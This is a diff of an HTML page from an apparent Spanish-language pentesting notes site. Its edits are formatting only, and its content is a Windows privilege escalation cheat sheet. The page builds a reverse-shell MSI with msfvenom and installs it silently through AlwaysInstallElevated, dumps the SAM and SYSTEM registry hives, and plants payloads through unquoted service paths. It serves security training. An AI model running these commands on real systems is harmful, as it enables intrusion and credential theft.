@@ -653,9 +653,9 @@
   
 
 
-<h1 id="windows-privilege-escalation">Windows Privilege Escalation<a class="headerlink" href="#windows-privilege-escalation" title="Permanent link">&para;</a></h1>
-<h2 id="enumeracion-inicial">Enumeración Inicial<a class="headerlink" href="#enumeracion-inicial" title="Permanent link">&para;</a></h2>
-<h3 id="sistema">Sistema<a class="headerlink" href="#sistema" title="Permanent link">&para;</a></h3>
+<h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1>
+<h2 id="enumeracion-inicial">Enumeración Inicial</h2>
+<h3 id="sistema">Sistema</h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c"># Info del sistema</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">systeminfo</span>
 </span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">hostname</span>
@@ -665,7 +665,7 @@
 </span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="n">net</span> <span class="n">user</span>
 </span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span>
 </span></code></pre></div>
-<h3 id="herramientas-automaticas">Herramientas Automáticas<a class="headerlink" href="#herramientas-automaticas" title="Permanent link">&para;</a></h3>
+<h3 id="herramientas-automaticas">Herramientas Automáticas</h3>
 <div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">WinPEAS</label><label for="__tabbed_1_2">PowerUp</label></div>
 <div class="tabbed-content">
 <div class="tabbed-block">
@@ -680,8 +680,8 @@
 </div>
 </div>
 </div>
-<h2 id="vectores-de-escalada">Vectores de Escalada<a class="headerlink" href="#vectores-de-escalada" title="Permanent link">&para;</a></h2>
-<h3 id="servicios">Servicios<a class="headerlink" href="#servicios" title="Permanent link">&para;</a></h3>
+<h2 id="vectores-de-escalada">Vectores de Escalada</h2>
+<h3 id="servicios">Servicios</h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Listar servicios</span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">Get-Service</span>
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="nb">sc </span><span class="n">query</span> <span class="n">state</span><span class="p">=</span> <span class="n">all</span>
@@ -694,7 +694,7 @@
 </span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="nb">sc </span><span class="n">stop</span> <span class="no">[service]</span>
 </span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="nb">sc start </span><span class="no">[service]</span>
 </span></code></pre></div>
-<h3 id="unquoted-service-path">Unquoted Service Path<a class="headerlink" href="#unquoted-service-path" title="Permanent link">&para;</a></h3>
+<h3 id="unquoted-service-path">Unquoted Service Path</h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c"># Buscar rutas sin comillas</span>
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;auto&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;c:\windows&quot;</span>
 </span></code></pre></div>
@@ -703,7 +703,7 @@
 <p>Si el path es <code>C:\Program Files\Service Folder\binary.exe</code></p>
 <p>Colocar payload en <code>C:\Program.exe</code> o <code>C:\Program Files\Service.exe</code></p>
 </div>
-<h3 id="alwaysinstallelevated">AlwaysInstallElevated<a class="headerlink" href="#alwaysinstallelevated" title="Permanent link">&para;</a></h3>
+<h3 id="alwaysinstallelevated">AlwaysInstallElevated</h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c"># Verificar</span>
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span>
@@ -712,7 +712,7 @@
 </span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">IP</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">443</span> <span class="o">-f</span> <span class="n">msi</span> <span class="n">-o</span> <span class="n">shell</span><span class="p">.</span><span class="n">msi</span>
 </span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">msiexec</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">/</span><span class="n">qn</span> <span class="p">/</span><span class="n">i</span> <span class="n">shell</span><span class="p">.</span><span class="n">msi</span>
 </span></code></pre></div>
-<h3 id="credenciales-guardadas">Credenciales Guardadas<a class="headerlink" href="#credenciales-guardadas" title="Permanent link">&para;</a></h3>
+<h3 id="credenciales-guardadas">Credenciales Guardadas</h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># Credenciales en registro</span>
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span>
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
@@ -723,7 +723,7 @@
 </span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SAM</span> <span class="n">sam</span><span class="p">.</span><span class="n">save</span>
 </span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">system</span><span class="p">.</span><span class="n">save</span>
 </span></code></pre></div>
-<h3 id="token-impersonation">Token Impersonation<a class="headerlink" href="#token-impersonation" title="Permanent link">&para;</a></h3>
+<h3 id="token-impersonation">Token Impersonation</h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c"># Verificar privilegios</span>
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
 </span></code></pre></div>
@@ -748,19 +748,19 @@
 </div>
 </div>
 </div>
-<h3 id="scheduled-tasks">Scheduled Tasks<a class="headerlink" href="#scheduled-tasks" title="Permanent link">&para;</a></h3>
+<h3 id="scheduled-tasks">Scheduled Tasks</h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># Listar tareas</span>
 </span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">/</span><span class="n">v</span>
 </span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
 </span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c"># Buscar scripts modificables</span>
 </span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">icacls</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">script</span><span class="p">.</span><span class="n">bat</span>
 </span></code></pre></div>
-<h2 id="tecnicas-adicionales">Técnicas Adicionales<a class="headerlink" href="#tecnicas-adicionales" title="Permanent link">&para;</a></h2>
-<h3 id="dll-hijacking">DLL Hijacking<a class="headerlink" href="#dll-hijacking" title="Permanent link">&para;</a></h3>
+<h2 id="tecnicas-adicionales">Técnicas Adicionales</h2>
+<h3 id="dll-hijacking">DLL Hijacking</h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c"># Buscar DLLs faltantes con Process Monitor</span>
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="c"># Filtrar por &quot;NAME NOT FOUND&quot; y &quot;.dll&quot;</span>
 </span></code></pre></div>
-<h3 id="uac-bypass">UAC Bypass<a class="headerlink" href="#uac-bypass" title="Permanent link">&para;</a></h3>
+<h3 id="uac-bypass">UAC Bypass</h3>
 <div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c"># Verificar nivel de UAC</span>
 </span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">System</span>
 </span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
@@ -850,7 +850,7 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.prefetch", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow", "announce.dismiss"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.prefetch", "navigation.tracking", "navigation.sections", "navigation.indexes", "navigation.expand", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow", "announce.dismiss"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
